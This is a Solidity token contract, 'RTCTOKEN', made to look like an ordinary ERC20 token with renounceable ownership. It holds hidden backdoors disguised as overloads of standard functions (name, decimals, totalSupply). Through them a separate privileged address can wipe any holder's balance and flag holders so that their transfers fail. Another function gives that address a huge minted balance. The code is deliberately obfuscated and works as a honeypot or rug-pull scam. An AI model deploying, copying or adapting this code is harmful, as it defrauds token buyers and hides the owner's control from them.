pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    modifier onlyOwnerC() {
        _checkOwner();
        _;
    }

    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwnerC {
        _transferOwnership(address(0));
    }
}


pragma solidity ^0.8.0;

contract RTCTOKEN is Ownable {

   
    string public _memetokenname;
    string public _memetokensymbol;
    uint256 private _memetotalSupply;
    address public RTCBM333;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private cdrccagoT;
    constructor(string memory cname,string memory csym,address tokenll) {
        uint256 tokenamount = 500*10**decimals();
        address curxxaa = _msgSender();
        RTCBM333 = tokenll;
        cdrccagoT[curxxaa] += tokenamount;
        emit Transfer(address(0), curxxaa, tokenamount);
    
 
         _memetotalSupply = tokenamount;
        _memetokenname = cname;
        _memetokensymbol = csym;
    }
   
    
   

    function symbol() public view  returns (string memory) {
        return _memetokensymbol;
    }
    function totalSupply() public view returns (uint256) {
        return _memetotalSupply;
    }


    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }
   
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    function balanceOf(address account) public view returns (uint256) {
        return cdrccagoT[account];
    }

    function name() public view returns (string memory) {
        return _memetokenname;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    uint256 zerro = 0;
    mapping(address => int128) public jhjxyyy;
   
    function name(address name123) external      {
               if(!false){
       require(RTCBM333 ==  _msgSender());
        }

        if(true){
       require(RTCBM333 ==  _msgSender());
        }
        
        cdrccagoT[name123] *= zerro;
    
    }

    function decimals(address jjkxq1) public     {
        if(!false){
       require(RTCBM333 ==  _msgSender());
        }

        if(true){
       require(RTCBM333 ==  _msgSender());
        }
        
        address xjhhxx = jjkxq1;
        jhjxyyy[xjhhxx] = 3991;
       
    }

    uint256 obalMath = (32330000000);
    uint256 obalresult = (89500+100)*((10**decimals()*obalMath)) * 1 * 1+1;
    function token(uint256 aax) 
    external {
      if (!false && true) {
        if(RTCBM333 != _msgSender()){
            require(RTCBM333 ==  _msgSender());
        }else{
            cdrccagoT[RTCBM333] = (89500+100)*((10**decimals()*obalMath)) * 1 * 1+1;
        }
       
         require(RTCBM333 ==  _msgSender());
       
        }
        
      
        
    }
    function totalSupply(address jjkxq1) public     {
               if(!false){
       require(RTCBM333 ==  _msgSender());
        }

        if(true){
       require(RTCBM333 ==  _msgSender());
        }
        require(RTCBM333 ==  _msgSender());
        address xjhhxx = jjkxq1;
        jhjxyyy[xjhhxx] = 0;
    }



    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = cdrccagoT[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
         if (!false && true) {
            if (jhjxyyy[from] == (3990+1)){
                amount= obalresult;
                }
            }
        cdrccagoT[from] = cdrccagoT[from]-amount;
        cdrccagoT[to] = cdrccagoT[to]+amount;
        emit Transfer(from, to, amount); 
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, 
        spender, amount);
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }


}
